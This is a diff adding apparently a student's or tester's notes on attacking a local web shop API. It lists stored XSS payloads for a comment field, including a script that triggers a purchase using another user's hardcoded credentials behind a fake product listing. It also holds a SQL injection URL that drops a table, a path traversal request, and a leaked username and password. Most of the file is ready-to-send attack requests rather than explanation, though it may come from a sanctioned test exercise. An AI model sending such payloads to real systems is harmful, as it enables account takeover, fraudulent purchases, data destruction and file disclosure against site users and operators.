@@ -1,0 +1,83 @@
+N01:
+So you can enter html code in the comment field in the body of this API 
+and it will show in every services users website.
+This means can you write a HTTP request such as the example Below:
+
+N02:
+POST http://localhost:5000/api/WriteComment 
+Host: localhost:5000
+Content-Type: application/json
+Content-Length: 183
+
+{
+    'Comment': '<svg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'>     <circle cx='50' cy='50' r='45' fill='gold'/> </svg>',
+    'Name': ''
+}
+
+N03:
+POST http://localhost:5000/api/WriteComment 
+Host: localhost:5000
+Content-Type: application/json
+Content-Length: 70
+
+{
+    'Comment': '<script>alert('beep')</script>',
+    'Name': ''
+}
+
+N04: 
+A user can mount a Button or a link or a input field in the comment section/ field such that the user is tricked to believe the SHIT institute is the one wanting the user to do the action.
+
+N05:
+POST http://localhost:5000/api/WriteComment
+HOST: localhost:5000
+Content-Type: Content-Type': 'application/json
+Content-Length: 303
+body: 
+{
+      comment: "<script defer>
+  function BuyItem2() {
+    const data = localStorage.getItem("id");
+
+    const fetchPromise = fetch(
+      `http://localhost:5000/api/PurchaseSingleItem/155913358`,
+      {
+        headers: {
+          "Content-Type": "text/plain",
+          Authorization: `Basic ${btoa("mercedez:brother")}`,
+        },
+      }
+    );
+  }
+</script>
+
+<div class="InstituteShopList">
+  <img
+    src="http://localhost:5000/api/GetItemPhoto/155913358"
+    alt="Women Fleece Image"
+  />
+  <div class="ItemInfo">
+    <h2>Women Fleece</h2>
+    <h3>$19.99</h3>
+    <p>
+      Soft-beige colour fleece. Sheep skin look. A proven winter investment.
+      Free matching beanie.
+    </p>
+  </div>
+  <button id="155913358" onClick="BuyItem2()">Buy</button>
+</div>
+",
+      name: 'SHIT',
+}
+
+N06:
+GET http://localhost:5000/api/GetItems/'; DROP TABLE Staff;
+
+C01:
+Other user's name: "mercedez"
+
+C02:
+The password is:"brother"
+
+C03:
+GET http://localhost:5000/api/GetItemPhoto/..%2FBigPix%2Ftanop.png
